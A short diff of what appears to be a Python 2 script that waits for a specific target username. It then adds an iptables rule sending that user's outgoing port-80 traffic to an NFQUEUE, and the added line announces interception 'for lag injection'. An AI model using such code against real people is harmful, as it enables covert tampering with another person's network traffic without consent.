@@ -33,4 +33,5 @@ while True:
     if username == targetusername and not haveSetTables:
       print "that's the user we want! start the attack!"
       os.system('sudo iptables -A OUTPUT -p tcp -d ' + ip + ' --sport 80 -j NFQUEUE --queue-num 0')
+      print 'set up iptables to intercept his traffic for lag injection'
       haveSetTables = True
